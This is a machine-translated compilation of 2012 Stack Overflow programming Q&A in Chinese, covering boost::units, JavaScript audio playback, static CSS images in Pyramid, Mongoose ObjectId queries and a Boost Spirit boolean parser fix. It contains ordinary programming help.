这些似乎意味着一定有某种原因这种做法没有像我预期的那样被广泛采用。出于某种原因，也许比他们值得的麻烦更多？

所以我问：

*是否有理由不使用单元强制类型？特别是有理由不使用 boost::units 吗？*

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-25T16:28:27.887

我认为这种技术不流行的主要原因是拼写和阅读非常困难和麻烦。

希望这最终会成为 C++11 的一种更被接受的编程风格，它将*用户定义的文字*添加到允许您编写的语言中：

```
auto acc = 10_m / 1_s / 1_s; 
```

而不是传统的

```
myframework::units::si<acceleration>::type acc = myframework::unit_cast<units::meters>(10.0)
   / myframework::unit_cast<units::seconds>(1)
   / myframework::unit_cast<units::seconds>(1); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2015-09-19T22:36:44.800

我已经使用这个库来编写正确的代码了。不幸的是，它的使用难度是应有的 10 倍。尽管跟踪尺寸和单位是一场噩梦，但这仍然是值得的。

boost 单元库非常聪明、强大和完整。问题是，文档几乎不可读。名称混淆有很多问题，没有类型要求。作者提供了许多有用的示例 - 但不能替代构建更好的文档。

仅供参考 - 我在 CPPcon 2015 上介绍了一个关于这个主题的教程。你可以在[https://www.youtube.com/watch?v=qphj8ZuZlPA找到它](https://www.youtube.com/watch?v=qphj8ZuZlPA)

# javascript - 在 java 脚本函数中使用嵌入

> ID：12587139
> 
> 赞同：0
> 
> 时间：2012-09-25T16:24:15.063
> 
> 标签：javascript, html, audio

我在我的网站上播放 mp3 声音时遇到问题。在普通页面中，我使用 embed 标签播放 mp3 文件，该文件使用 swf 文件播放声音。现在我想在 javascript 事件上播放声音，例如当按下按钮时，或者当用户输入字母时。我尝试使用事件发生时调用的 Javascript 函数，但我无法弄清楚如何使用该函数播放 mp3 文件。请帮忙！！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-25T16:37:39.617

你可以这样做：

```
<div id="container"></div>

<script type="text/javascript">
  jwplayer("container").setup({
    file: "/videos/bunny.mp4",
    flashplayer: "jwplayer/jwplayer.swf",
    image: "/thumbs/bunny.jpg",
    height: 270,
    width: 480
  });
</script>

<ul>
  <li><a href="#" onclick="jwplayer().play();">Toggle the playback</a></li>
  <li><a href="#" onclick="jwplayer().setMute();">Toggle the audio</a></li>
  <li><a href="#" onclick="jwplayer().stop();">Stop playback</a></li>
</ul> 
```

[在这里](http://www.longtailvideo.com/support/jw-player/jw-player-for-flash-v5/16022/controlling-the-player-using-javascript)阅读更多

# python - 如何链接到 css 文件中的静态图像？

> ID：12587144
> 
> 赞同：7
> 
> 时间：2012-09-25T16:24:40.930
> 
> 标签：python, pylons, pyramid

新手到金字塔和蟒蛇。我已经能够在我的任何 jinja2 模板中成功链接到我的静态文件，即：

```
<link rel="stylesheet" type="text/css" href="{{'myproject:static/mycss.css'|static_url}}"></link> 
```

.css 文件加载良好，只要我在 jinja 模板中执行此操作，我就可以链接到我的静态文件夹中的任何图像。

我想使用图像作为背景，但无法链接到我的 css 文件中的图像：

```
#mydiv{
background-image:url("{{'myproject:static/myimage.gif'|static_url}}");
} 
```

此链接在 mycss.css 中显示为

`"{{'myproject:static/myimage.gif'|static_url}}"`

并且不显示为链接。（如果我加载一个外部托管的图像作为我的背景图像它可以工作）

谢谢！

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-09-25T16:26:16.997

您的 CSS 文件是静态文件，因此*不*被视为模板。所有静态资源都按原样提供，无需任何处理。

CSS 文件中的所有非绝对 URL 都与加载 CSS 文件的位置相关；如果您使用`background-image:url("myimage.gif")`，浏览器会加载相对于您的 CSS 文件位置的图像。由于 CSS 是从 加载的`http://yoursite/static/mycss.css`，因此图像将从 加载`http://yoursite/static/myimage.gif`。

或者，如果您从不寻常的位置引用文件（例如，由您的一个视图自动生成的图像）​​，您将不得不将您的 CSS 文件添加为视图，并使用（文本）模板呈现它。

# node.js - MongooseJS 使用 find 通过引用查找

> ID：12587147
> 
> 赞同：4
> 
> 时间：2012-09-25T16:24:45.110
> 
> 标签：node.js, mongodb, express, mongoose

我有这个猫鼬模式。

```
var mongoose = require ('mongoose')
  , dev      = require ('../db').dev ();

var schema = new mongoose.Schema ({
  date: {
    type: Date,
    default: Date.now
  },
  company: {
    type: mongoose.Schema.Types.ObjectId,
    ref: 'Company'
  },
  questionnaire: {
    type: mongoose.Schema.Types.ObjectId,
    ref: 'Questionnaire'
  }
});

module.exports = dev.model ('Survey', schema); 
```

我只想找到具有特定公司 ID 的调查。我怎么做？我试过（用我的 Express 处理程序）：

```
app.get ('/survey', function (req, res) {
  Survey.find ({ company: req.query.company }).populate ('questionnaire').exec (function (err, surveys) {
    return res.json (surveys);
  });
}); 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-28T19:05:58.957

在您的最新评论中，您说集合的`company`字段`Surveys`实际上是一个字符串，而不是 ObjectId，这就是为什么这不起作用。因为您的架构定义声明`company`为 ObjectId，Mongoose 会将您的`req.query.company`值转换为 ObjectId，然后查询`Surveys`其`company`属性为具有相同值的 ObjectId 的文档。因此，如果`company`是数据库中的字符串，它将不匹配。

如果您将`company`值更新`Surveys`为 ObjectIds 而不是字符串，那么这将起作用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-25T17:54:13.180

你有没有尝试过`'company._id`

```
app.get ('/survey', function (req, res) {
  Survey.find ({ 'company._id': req.query.company }).populate ('questionnaire').exec (function (err, surveys) {
    return res.json (surveys);
  });
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-05-17T11:36:22.743

对我有用（并且在接受的答案中暗示）是确保文档是通过猫鼬（即通过您的快速服务器）创建的，因为这会将架构强制到它们上，因此 ID 将存储为 objectIds .

最初，我使用 objectIds 作为简单字符串通过数据库手动创建了一个文档，这导致查询不起作用，因为 mongo 将 id（来自您的服务器）转换为 ObjectId。

# c++ - 使用 Boost 的布尔表达式

> ID：12587148
> 
> 赞同：2
> 
> 时间：2012-09-25T16:24:47.260
> 
> 标签：c++, parsing, boost, boost-spirit, boost-spirit-qi

我试图简单地在这个答案中找到精神解析器：

*   [C ++中的布尔表达式（语法）解析器](https://stackoverflow.com/questions/8706356/boolean-expression-grammar-parser-in-c/8707598#8707598)

删除`xor`运算符和逻辑。我看不到该怎么做，我尝试使用

```
expr_  = or_.alias();

or_  = (and__ >> "or"  >> or_ )[ _val = phx::construct<binop<op_or >>(_1, _2) ]     | and_   [ _val = _1 ];
and_ = (not_ >> "and" >> and_) [ _val = phx::construct<binop<op_and>>(_1, _2) ] | not_   [ _val = _1 ];
not_ = ("not" > simple       ) [ _val = phx::construct<unop <op_not>>(_1)     ] | simple [ _val = _1 ]; 
```

对于规则定义，但我收到一条我不明白的神秘编译器消息：

```
test\test.cpp `boost::spirit::_2' cannot appear in a constant-expression 
```

如果有人能提供一些启示，我将不胜感激。

这是日志：

```
compiler: Default compiler  Building Makefile:
   "D:\Dev-Cpp\test\Makefile.win" Executing  make... make.exe -f
   "D:\Dev-Cpp\test\Makefile.win" all g++.exe -c test.cpp -o test.o
   -I"D:/Dev-Cpp/lib/gcc/mingw32/3.4.2/include"  -I"D:/Dev-Cpp/include/c++/3.4.2/backward"  -I"D:/Dev-Cpp/include/c++/3.4.2/mingw32"  -I"D:/Dev-Cpp/include/c++/3.4.2"  -I"D:/Dev-Cpp/include"   

   test.cpp: In constructor `parser<It, Skipper>::parser()':
   test.cpp:76: error: `boost::spirit::_1' cannot appear in a
   constant-expression test.cpp:76: error: a comma operator cannot
   appear in a constant-expression test.cpp:76: error:
   `boost::spirit::_2' cannot appear in a constant-expression
   test.cpp:76: error: `>>' should be `> >' within a nested template
   argument list

   test.cpp:77: error: `boost::spirit::_1' cannot appear in a
   constant-expression

   test.cpp:77: error: a comma operator cannot appear in a
   constant-expression test.cpp:77: error: `boost::spirit::_2' cannot
   appear in a constant-expression test.cpp:77: error: `>>' should be `>
   >' within a nested template argument list

   test.cpp:78: error: `boost::spirit::_1' cannot appear in a
   constant-expression

   test.cpp:78: error: `>>' should be `> >' within a nested template
   argument list

   test.cpp: In function `int main()': test.cpp:98: error: expected
   primary-expression before "auto" test.cpp:98: error: expected `;'
   before "auto"

   test.cpp:111: error: expected primary-expression before ')' token
   test.cpp:111: error: expected `;' before ')' token test.cpp:113:
   error: ISO C++ forbids declaration of `f' with no type test.cpp:113:
   error: `begin' is not a member of `std' test.cpp:113: error: `input'
   undeclared (first use this function) test.cpp:113: error: (Each
   undeclared identifier is reported only once for each function it
   appears in.) test.cpp:113: error: ISO C++ forbids declaration of `l'
   with no type test.cpp:113: error: `end' is not a member of `std'
   test.cpp:114: error: `f' cannot appear in a constant-expression
   test.cpp:114: error: a function call cannot appear in a
   constant-expression test.cpp:114: error: template argument 1 is
   invalid test.cpp:114: error: invalid type in declaration before ';'
   token

   test.cpp:126: error: `f' cannot appear in a constant-expression
   test.cpp:126: error: a function call cannot appear in a
   constant-expression test.cpp:126: error: template argument 1 is
   invalid test.cpp:126: error: ISO C++ forbids declaration of `e' with
   no type

   test.cpp:128: error: expected primary-expression before '(' token
   test.cpp:128: error: `first' has not been declared test.cpp:128:
   error: request for member of non-aggregate type before ',' token
   test.cpp:128: error: `last' has not been declared test.cpp:128:
   error: request for member of non-aggregate type before ')' token

   D:/Dev-Cpp/include/c++/3.4.2/bits/stl_iterator_base_types.h: At
   global scope:
   D:/Dev-Cpp/include/c++/3.4.2/bits/stl_iterator_base_types.h: In
   instantiation of `std::iterator_traits<int>':
   D:/Dev-Cpp/include/boost/detail/iterator.hpp:83:   instantiated from
   `boost::detail::iterator_traits<int>'
   D:/Dev-Cpp/include/boost/concept_check.hpp:509:   instantiated from
   `boost::InputIterator<int>'
   D:/Dev-Cpp/include/boost/concept_check.hpp:545:   instantiated from
   `boost::ForwardIterator<int>'
   D:/Dev-Cpp/include/boost/concept/detail/has_constraints.hpp:42:  
   instantiated from
   `boost::concepts::not_satisfied<boost::ForwardIterator<int> >'
   D:/Dev-Cpp/include/boost/mpl/if.hpp:67:   instantiated from
   `boost::mpl::if_<boost::concepts::not_satisfied<boost::ForwardIterator<int>
   >, boost::concepts::constraint<boost::ForwardIterator<int> >, boost::concepts::requirement<boost::concepts::failed************boost::ForwardIterator<int>::************>
   >' D:/Dev-Cpp/include/boost/concept/detail/general.hpp:56:   instantiated from `boost::concepts::requirement_<void
   (*)(boost::ForwardIterator<int>)>'
   D:/Dev-Cpp/include/boost/spirit/home/qi/parse.hpp:149:   instantiated
   from `bool boost::spirit::qi::phrase_parse(Iterator&, Iterator, const
   Expr&, const Skipper&, boost::spirit::qi::skip_flag::enum_type,
   Attr&) [with Iterator = int, Expr = bool, Skipper =
   boost::proto::exprns_::expr<boost::proto::tagns_::tag::terminal,
   boost::proto::argsns_::term<boost::spirit::tag::char_code<boost::spirit::tag::space,
   boost::spirit::char_encoding::standard> >, 0l>, Attr =
   boost::variant<var, boost::recursive_wrapper<unop<op_not> >,
   boost::recursive_wrapper<binop<op_and> >,
   boost::recursive_wrapper<binop<op_or> >,
   boost::detail::variant::void_, boost::detail::variant::void_,
   boost::detail::variant::void_, boost::detail::variant::void_,
   boost::detail::variant::void_, boost::detail::variant::void_,
   boost::detail::variant::void_, boost::detail::variant::void_,
   boost::detail::variant::void_, boost::detail::variant::void_,
   boost::detail::variant::void_, boost::detail::variant::void_,
   boost::detail::variant::void_, boost::detail::variant::void_,
   boost::detail::variant::void_, boost::detail::variant::void_>]'
   D:/Dev-Cpp/include/boost/spirit/home/qi/parse.hpp:197:   instantiated
   from `bool boost::spirit::qi::phrase_parse(Iterator&, Iterator, const
   Expr&, const Skipper&, Attr&) [with Iterator = int, Expr = bool,
   Skipper = boost::spirit::standard::space_type, Attr = expr]'
   test.cpp:119:   instantiated from here
   D:/Dev-Cpp/include/c++/3.4.2/bits/stl_iterator_base_types.h:129:
   error: `int' is not a class, struct, or union type
   D:/Dev-Cpp/include/c++/3.4.2/bits/stl_iterator_base_types.h:130:
   error: `int' is not a class, struct, or union type
   D:/Dev-Cpp/include/c++/3.4.2/bits/stl_iterator_base_types.h:131:
   error: `int' is not a class, struct, or union type
   D:/Dev-Cpp/include/c++/3.4.2/bits/stl_iterator_base_types.h:132:
   error: `int' is not a class, struct, or union type
   D:/Dev-Cpp/include/c++/3.4.2/bits/stl_iterator_base_types.h:133:
   error: `int' is not a class, struct, or union type
   D:/Dev-Cpp/include/boost/concept_check.hpp: In instantiation of
   `boost::InputIterator<int>':
   D:/Dev-Cpp/include/boost/concept_check.hpp:545:   instantiated from
   `boost::ForwardIterator<int>'
   D:/Dev-Cpp/include/boost/concept/detail/has_constraints.hpp:42:  
   instantiated from
   `boost::concepts::not_satisfied<boost::ForwardIterator<int> >'
   D:/Dev-Cpp/include/boost/mpl/if.hpp:67:   instantiated from
   `boost::mpl::if_<boost::concepts::not_satisfied<boost::ForwardIterator<int>
   >, boost::concepts::constraint<boost::ForwardIterator<int> >, boost::concepts::requirement<boost::concepts::failed************boost::ForwardIterator<int>::************>
   >' D:/Dev-Cpp/include/boost/concept/detail/general.hpp:56:   instantiated from `boost::concepts::requirement_<void
   (*)(boost::ForwardIterator<int>)>'
   D:/Dev-Cpp/include/boost/spirit/home/qi/parse.hpp:149:   instantiated
   from `bool boost::spirit::qi::phrase_parse(Iterator&, Iterator, const
   Expr&, const Skipper&, boost::spirit::qi::skip_flag::enum_type,
   Attr&) [with Iterator = int, Expr = bool, Skipper =
   boost::proto::exprns_::expr<boost::proto::tagns_::tag::terminal,
   boost::proto::argsns_::term<boost::spirit::tag::char_code<boost::spirit::tag::space,
   boost::spirit::char_encoding::standard> >, 0l>, Attr =
   boost::variant<var, boost::recursive_wrapper<unop<op_not> >,
   boost::recursive_wrapper<binop<op_and> >,
   boost::recursive_wrapper<binop<op_or> >,
   boost::detail::variant::void_, boost::detail::variant::void_,
   boost::detail::variant::void_, boost::detail::variant::void_,
   boost::detail::variant::void_, boost::detail::variant::void_,
   boost::detail::variant::void_, boost::detail::variant::void_,
   boost::detail::variant::void_, boost::detail::variant::void_,
   boost::detail::variant::void_, boost::detail::variant::void_,
   boost::detail::variant::void_, boost::detail::variant::void_,
   boost::detail::variant::void_, boost::detail::variant::void_>]'
   D:/Dev-Cpp/include/boost/spirit/home/qi/parse.hpp:197:   instantiated
   from `bool boost::spirit::qi::phrase_parse(Iterator&, Iterator, const
   Expr&, const Skipper&, Attr&) [with Iterator = int, Expr = bool,
   Skipper = boost::spirit::standard::space_type, Attr = expr]'

   test.cpp:119:   instantiated from here
   D:/Dev-Cpp/include/boost/concept_check.hpp:509: error: no type named
   `value_type' in `struct boost::detail::iterator_traits<int>'
   D:/Dev-Cpp/include/boost/concept_check.hpp:510: error: no type named
   `difference_type' in `struct boost::detail::iterator_traits<int>'
   D:/Dev-Cpp/include/boost/concept_check.hpp:511: error: no type named
   `reference' in `struct boost::detail::iterator_traits<int>'
   D:/Dev-Cpp/include/boost/concept_check.hpp:512: error: no type named
   `pointer' in `struct boost::detail::iterator_traits<int>'
   D:/Dev-Cpp/include/boost/concept_check.hpp:513: error: no type named
   `iterator_category' in `struct boost::detail::iterator_traits<int>'

   D:/Dev-Cpp/include/boost/spirit/home/qi/parse.hpp: In function `bool
   boost::spirit::qi::phrase_parse(Iterator&, Iterator, const Expr&,
   const Skipper&, boost::spirit::qi::skip_flag::enum_type, Attr&) [with
   Iterator = int, Expr = bool, Skipper =
   boost::proto::exprns_::expr<boost::proto::tagns_::tag::terminal,
   boost::proto::argsns_::term<boost::spirit::tag::char_code<boost::spirit::tag::space,
   boost::spirit::char_encoding::standard> >, 0l>, Attr =
   boost::variant<var, boost::recursive_wrapper<unop<op_not> >,
   boost::recursive_wrapper<binop<op_and> >,
   boost::recursive_wrapper<binop<op_or> >,
   boost::detail::variant::void_, boost::detail::variant::void_,
   boost::detail::variant::void_, boost::detail::variant::void_,
   boost::detail::variant::void_, boost::detail::variant::void_,
   boost::detail::variant::void_, boost::detail::variant::void_,
   boost::detail::variant::void_, boost::detail::variant::void_,
   boost::detail::variant::void_, boost::detail::variant::void_,
   boost::detail::variant::void_, boost::detail::variant::void_,
   boost::detail::variant::void_, boost::detail::variant::void_>]':
   D:/Dev-Cpp/include/boost/spirit/home/qi/parse.hpp:197:   instantiated
   from `bool boost::spirit::qi::phrase_parse(Iterator&, Iterator, const
   Expr&, const Skipper&, Attr&) [with Iterator = int, Expr = bool,
   Skipper = boost::spirit::standard::space_type, Attr = expr]'

   test.cpp:119:   instantiated from here
   D:/Dev-Cpp/include/boost/spirit/home/qi/parse.hpp:155: error:
   conversion from
   `mpl_::failed************(boost::spirit::qi::phrase_parse(Iterator&,
   Iterator, const Expr&, const Skipper&,
   boost::spirit::qi::skip_flag::enum_type, Attr&) [with Iterator = int,
   Expr = bool, Skipper =
   boost::proto::exprns_::expr<boost::proto::tagns_::tag::terminal,
   boost::proto::argsns_::term<boost::spirit::tag::char_code<boost::spirit::tag::space,
   boost::spirit::char_encoding::standard> >, 0l>, Attr =
   boost::variant<var, boost::recursive_wrapper<unop<op_not> >,
   boost::recursive_wrapper<binop<op_and> >,
   boost::recursive_wrapper<binop<op_or> >,
   boost::detail::variant::void_, boost::detail::variant::void_,
   boost::detail::variant::void_, boost::detail::variant::void_,
   boost::detail::variant::void_, boost::detail::variant::void_,
   boost::detail::variant::void_, boost::detail::variant::void_,
   boost::detail::variant::void_, boost::detail::variant::void_,
   boost::detail::variant::void_, boost::detail::variant::void_,
   boost::detail::variant::void_, boost::detail::variant::void_,
   boost::detail::variant::void_,
   boost::detail::variant::void_>]::error_invalid_expression::************)(bool)'
   to non-scalar type `mpl_::assert< false>' requested
   D:/Dev-Cpp/include/boost/spirit/home/qi/parse.hpp:155: error:
   enumerator value for `mpl_assertion_in_line_155' not integer constant

   D:/Dev-Cpp/include/boost/spirit/home/qi/parse.hpp:197:   instantiated
   from `bool boost::spirit::qi::phrase_parse(Iterator&, Iterator, const
   Expr&, const Skipper&, Attr&) [with Iterator = int, Expr = bool,
   Skipper = boost::spirit::standard::space_type, Attr = expr]'
   test.cpp:119:   instantiated from here
   D:/Dev-Cpp/include/boost/spirit/home/qi/parse.hpp:164: error: request
   for member `parse' in `boost::spirit::compile [with Domain =
   boost::spirit::qi::domain, Expr = bool](((const bool&)(+expr)))',
   which is of non-class type `bool'

   D:/Dev-Cpp/include/boost/concept_check.hpp: In destructor
   `boost::ForwardIterator<TT>::~ForwardIterator() [with TT = int]':
   D:/Dev-Cpp/include/boost/concept/detail/general.hpp:38:  
   instantiated from `static void
   boost::concepts::requirement<boost::concepts::failed************Model::************>::failed()
   [with Model = boost::ForwardIterator<int>]'
   D:/Dev-Cpp/include/boost/spirit/home/qi/parse.hpp:149:   instantiated
   from `bool boost::spirit::qi::phrase_parse(Iterator&, Iterator, const
   Expr&, const Skipper&, boost::spirit::qi::skip_flag::enum_type,
   Attr&) [with Iterator = int, Expr = bool, Skipper =
   boost::proto::exprns_::expr<boost::proto::tagns_::tag::terminal,
   boost::proto::argsns_::term<boost::spirit::tag::char_code<boost::spirit::tag::space,
   boost::spirit::char_encoding::standard> >, 0l>, Attr =
   boost::variant<var, boost::recursive_wrapper<unop<op_not> >,
   boost::recursive_wrapper<binop<op_and> >,
   boost::recursive_wrapper<binop<op_or> >,
   boost::detail::variant::void_, boost::detail::variant::void_,
   boost::detail::variant::void_, boost::detail::variant::void_,
   boost::detail::variant::void_, boost::detail::variant::void_,
   boost::detail::variant::void_, boost::detail::variant::void_,
   boost::detail::variant::void_, boost::detail::variant::void_,
   boost::detail::variant::void_, boost::detail::variant::void_,
   boost::detail::variant::void_, boost::detail::variant::void_,
   boost::detail::variant::void_, boost::detail::variant::void_>]'
   D:/Dev-Cpp/include/boost/spirit/home/qi/parse.hpp:197:   instantiated
   from `bool boost::spirit::qi::phrase_parse(Iterator&, Iterator, const
   Expr&, const Skipper&, Attr&) [with Iterator = int, Expr = bool,
   Skipper = boost::spirit::standard::space_type, Attr = expr]'
   test.cpp:119:   instantiated from here
   D:/Dev-Cpp/include/boost/concept_check.hpp:548: error: no type named
   `iterator_category' in `struct boost::ForwardIterator<int>'
   D:/Dev-Cpp/include/boost/concept_check.hpp:548: error: `failed' is
   not a member of `<declaration error>'
   D:/Dev-Cpp/include/boost/concept_check.hpp:553: error: no type named
   `reference' in `struct boost::InputIterator<int>'
   D:/Dev-Cpp/include/boost/concept_check.hpp:554: error: no type named
   `reference' in `struct boost::InputIterator<int>'

   D:/Dev-Cpp/include/boost/spirit/home/qi/char/char_parser.hpp: In
   member function `bool boost::spirit::qi::char_parser<Derived, Char,
   Attr>::parse(Iterator&, const Iterator&, Context&, const Skipper&,
   Attribute&) const [with Iterator = int, Context = const
   boost::spirit::unused_type, Skipper = boost::spirit::unused_type,
   Attribute = const boost::spirit::unused_type, Derived =
   boost::spirit::qi::char_class<boost::spirit::tag::char_code<boost::spirit::tag::space,
   boost::spirit::char_encoding::standard> >, Char = char, Attr =
   char]': D:/Dev-Cpp/include/boost/spirit/home/qi/skip_over.hpp:27:  
   instantiated from `void boost::spirit::qi::skip_over(Iterator&, const
   Iterator&, const T&) [with Iterator = int, T =
   boost::spirit::qi::char_class<boost::spirit::tag::char_code<boost::spirit::tag::space,
   boost::spirit::char_encoding::standard> >]'
   D:/Dev-Cpp/include/boost/spirit/home/qi/parse.hpp:169:   instantiated
   from `bool boost::spirit::qi::phrase_parse(Iterator&, Iterator, const
   Expr&, const Skipper&, boost::spirit::qi::skip_flag::enum_type,
   Attr&) [with Iterator = int, Expr = bool, Skipper =
   boost::proto::exprns_::expr<boost::proto::tagns_::tag::terminal,
   boost::proto::argsns_::term<boost::spirit::tag::char_code<boost::spirit::tag::space,
   boost::spirit::char_encoding::standard> >, 0l>, Attr =
   boost::variant<var, boost::recursive_wrapper<unop<op_not> >,
   boost::recursive_wrapper<binop<op_and> >,
   boost::recursive_wrapper<binop<op_or> >,
   boost::detail::variant::void_, boost::detail::variant::void_,
   boost::detail::variant::void_, boost::detail::variant::void_,
   boost::detail::variant::void_, boost::detail::variant::void_,
   boost::detail::variant::void_, boost::detail::variant::void_,
   boost::detail::variant::void_, boost::detail::variant::void_,
   boost::detail::variant::void_, boost::detail::variant::void_,
   boost::detail::variant::void_, boost::detail::variant::void_,
   boost::detail::variant::void_, boost::detail::variant::void_>]'
   D:/Dev-Cpp/include/boost/spirit/home/qi/parse.hpp:197:   instantiated
   from `bool boost::spirit::qi::phrase_parse(Iterator&, Iterator, const
   Expr&, const Skipper&, Attr&) [with Iterator = int, Expr = bool,
   Skipper = boost::spirit::standard::space_type, Attr = expr]'
   test.cpp:119:   instantiated from here
   D:/Dev-Cpp/include/boost/spirit/home/qi/char/char_parser.hpp:68:
   error: invalid type argument of `unary *'
   D:/Dev-Cpp/include/boost/spirit/home/qi/char/char_parser.hpp:70:
   error: invalid type argument of `unary *'

   D:/Dev-Cpp/include/boost/concept_check.hpp: In destructor
   `boost::InputIterator<TT>::~InputIterator() [with TT = int]':
   D:/Dev-Cpp/include/boost/concept_check.hpp:547:   instantiated from
   `boost::ForwardIterator<TT>::~ForwardIterator() [with TT = int]'
   D:/Dev-Cpp/include/boost/concept/detail/general.hpp:38:  
   instantiated from `static void
   boost::concepts::requirement<boost::concepts::failed************Model::************>::failed()
   [with Model = boost::ForwardIterator<int>]'
   D:/Dev-Cpp/include/boost/spirit/home/qi/parse.hpp:149:   instantiated
   from `bool boost::spirit::qi::phrase_parse(Iterator&, Iterator, const
   Expr&, const Skipper&, boost::spirit::qi::skip_flag::enum_type,
   Attr&) [with Iterator = int, Expr = bool, Skipper =
   boost::proto::exprns_::expr<boost::proto::tagns_::tag::terminal,
   boost::proto::argsns_::term<boost::spirit::tag::char_code<boost::spirit::tag::space,
   boost::spirit::char_encoding::standard> >, 0l>, Attr =
   boost::variant<var, boost::recursive_wrapper<unop<op_not> >,
   boost::recursive_wrapper<binop<op_and> >,
   boost::recursive_wrapper<binop<op_or> >,
   boost::detail::variant::void_, boost::detail::variant::void_,
   boost::detail::variant::void_, boost::detail::variant::void_,
   boost::detail::variant::void_, boost::detail::variant::void_,
   boost::detail::variant::void_, boost::detail::variant::void_,
   boost::detail::variant::void_, boost::detail::variant::void_,
   boost::detail::variant::void_, boost::detail::variant::void_,
   boost::detail::variant::void_, boost::detail::variant::void_,
   boost::detail::variant::void_, boost::detail::variant::void_>]'
   D:/Dev-Cpp/include/boost/spirit/home/qi/parse.hpp:197:   instantiated
   from `bool boost::spirit::qi::phrase_parse(Iterator&, Iterator, const
   Expr&, const Skipper&, Attr&) [with Iterator = int, Expr = bool,
   Skipper = boost::spirit::standard::space_type, Attr = expr]'
   test.cpp:119:   instantiated from here
   D:/Dev-Cpp/include/boost/concept_check.hpp:517: error: no type named
   `difference_type' in `struct boost::detail::iterator_traits<int>'
   D:/Dev-Cpp/include/boost/concept_check.hpp:517: error: `failed' is
   not a member of `<declaration error>'
   D:/Dev-Cpp/include/boost/concept_check.hpp:518: error: no type named
   `iterator_category' in `struct boost::detail::iterator_traits<int>'
   D:/Dev-Cpp/include/boost/concept_check.hpp:518: error: `failed' is
   not a member of `<declaration error>'
   D:/Dev-Cpp/include/boost/concept_check.hpp:521: error: invalid type
   argument of `unary *'

   make.exe: *** [test.o] Error 1

   Execution terminated 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-26T00:01:52.793

你不小心打错`and_`了`and__`。

更改`and__`为`and_`将使其编译。

这是一个更干净的版本，删除了现在不需要的与 相关的声明`xor`：

**编辑**对于不了解 auto、decltype、正确模板解析（`>>`vs. `> >`）等的旧编译器也“向后移植”）：

```
#include <boost/spirit/include/qi.hpp>
#include <boost/spirit/include/phoenix.hpp>
#include <boost/spirit/include/phoenix_operator.hpp>
#include <boost/variant/recursive_wrapper.hpp>

namespace qi    = boost::spirit::qi;
namespace phx   = boost::phoenix;

struct op_or  {};
struct op_and {};
struct op_not {};

typedef std::string var; 
template <typename tag> struct binop;
template <typename tag> struct unop;

typedef boost::variant<var, 
        boost::recursive_wrapper<unop <op_not> >, 
        boost::recursive_wrapper<binop<op_and> >,
        boost::recursive_wrapper<binop<op_or> >
        > expr;

template <typename tag> struct binop
{
    explicit binop(const expr& l, const expr& r) : oper1(l), oper2(r) { }
    expr oper1, oper2;
};

template <typename tag> struct unop
{
    explicit unop(const expr& o) : oper1(o) { }
    expr oper1;
};

struct printer : boost::static_visitor<void> 
{
    printer(std::ostream& os) : _os(os) {}
    std::ostream& _os;

    //
    void operator()(const var& v) const { _os << v; }

    void operator()(const binop<op_and>& b) const { print(" & ", b.oper1, b.oper2); }
    void operator()(const binop<op_or >& b) const { print(" | ", b.oper1, b.oper2); }

    void print(const std::string& op, const expr& l, const expr& r) const
    {
        _os << "(";
        boost::apply_visitor(*this, l);
        _os << op;
        boost::apply_visitor(*this, r);
        _os << ")";
    }

    void operator()(const unop<op_not>& u) const
    {
        _os << "(";
        _os << "!";
        boost::apply_visitor(*this, u.oper1);
        _os << ")";
    } 
};

std::ostream& operator<<(std::ostream& os, const expr& e) 
{ boost::apply_visitor(printer(os), e); return os; }

    template <typename It, typename Skipper = qi::space_type>
    struct parser : qi::grammar<It, expr(), Skipper>
{
        parser() : parser::base_type(expr_)
        {
            using namespace qi;

            expr_  = or_.alias();

            or_  = (and_ >> "or"  >> or_ ) [ _val = phx::construct<binop<op_or > >(_1, _2) ] | and_   [ _val = _1 ];
            and_ = (not_ >> "and" >> and_) [ _val = phx::construct<binop<op_and> >(_1, _2) ] | not_   [ _val = _1 ];
            not_ = ("not" > simple       ) [ _val = phx::construct<unop <op_not> >(_1)     ] | simple [ _val = _1 ];

            simple = (('(' > expr_ > ')') | var_);
            var_ = qi::lexeme[ +alpha ];

            BOOST_SPIRIT_DEBUG_NODE(expr_);
            BOOST_SPIRIT_DEBUG_NODE(or_);
            BOOST_SPIRIT_DEBUG_NODE(and_);
            BOOST_SPIRIT_DEBUG_NODE(not_);
            BOOST_SPIRIT_DEBUG_NODE(simple);
            BOOST_SPIRIT_DEBUG_NODE(var_);
        }

        private:
        qi::rule<It, var() , Skipper> var_;
        qi::rule<It, expr(), Skipper> not_, and_, or_, simple, expr_; 
};

int main() 
{
    const std::string inputs[] = { 
        // From the OP:
        std::string("(a and b) or ((c and d) or (a and b));"),
        std::string("a and b or (c and d or a and b);"),

        /// Simpler tests:
        std::string("a and b;"),
        std::string("a or b;"),
        std::string("a or b;"),
        std::string("not a;"),
        std::string("not a and b;"),
        std::string("not (a and b);"),
        std::string("a or b or c;"),
        std::string("") // marker
    };

    for (const std::string *i = inputs; !i->empty(); ++i)
    {
        typedef std::string::const_iterator It;
        It f(i->begin()), l(i->end());
        parser<It> p;

        try
        {
            expr result;
            bool ok = qi::phrase_parse(f,l,p > ';',qi::space,result);

            if (!ok)
                std::cerr << "invalid input\n";
            else
                std::cout << "result: " << result << "\n";

        } catch (const qi::expectation_failure<It>& e)
        {
            std::cerr << "expectation_failure at '" << std::string(e.first, e.last) << "'\n";
        }

        if (f!=l) std::cerr << "unparsed: '" << std::string(f,l) << "'\n";
    }

    return 0; 
} 
```

运行此示例的输出是

```
result: ((a & b) | ((c & d) | (a & b)))
result: ((a & b) | ((c & d) | (a & b)))
result: (a & b)
result: (a | b)
result: (a | b)
result: (!a)
result: ((!a) & b)
result: (!(a & b))
result: (a | (b | c)) 
```

# svn - SVN Achitecture - 同步/导出文件到远程服务器

> ID：12587153
> 
> 赞同：1
> 
> 时间：2012-09-25T16:25:12.863
> 
> 标签：svn

我即将设置一个 SVN 服务器，我需要将代码推送到一些不同风格的远程服务器（Windows 2008 和 Linux (Apache and Tomcat)）。

